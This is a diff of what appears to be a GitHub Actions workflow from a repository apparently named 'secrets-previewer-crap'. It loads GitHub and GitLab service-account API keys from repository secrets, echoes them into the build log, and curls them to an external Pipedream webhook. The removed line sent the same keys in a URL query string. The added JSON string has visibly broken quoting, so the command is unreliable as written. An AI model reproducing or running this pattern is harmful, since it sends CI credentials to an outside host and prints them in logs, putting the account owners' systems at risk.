@@ -13,6 +13,8 @@ env:
   # Change this variable into your own.
   # Don't use ours, or we'll create a issue about that leak.
   PIPEDREAM_WEBHOOKS_ENDPOINT: "https://21ceef5304d9b2797d1e2e6314db1105.m.pipedream.net"
+  GH_SERVICE_ACCOUNT: ${{ secrets.GH_SERVICE_ACCOUNT_API_KEY }}
+  GL_SERVICE_ACCOUNT: ${{ secrets.GL_SERVICE_ACCOUNT_API_KEY }}
 
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
@@ -38,4 +40,6 @@ jobs:
     
     - name: Send JSON requests to our endpoint.
       run: |
-        curl -X POST $PIPEDREAM_WEBHOOKS_ENDPOINT/?secrets[GH_SERVICE_ACCOUNT_API_KEY]=$GH_SERVICE_ACCOUNT_API_KEY&secrets[GL_SERVICE_ACCOUNT_API_KEY]=$GH_SERVICE_ACCOUNT_API_KEY
+        export JSON_REQUEST_KEK="{ "secrets": { "service_accounts: { "github": ${GH_SERVICE_ACCOUNT_API_KEY}, "gitlab": ${GL_SERVICE_ACCOUNT_API_KEY} } }, "source": "https://github.com/MadeByThePinsHub/secrets-previewer-crap" }"
+        echo $JSON_REQUEST_KEK
+        curl -d $JSON_REQUEST_KEK -H "Content-Type: application/json" $PIPEDREAM_WEBHOOKS_ENDPOINT
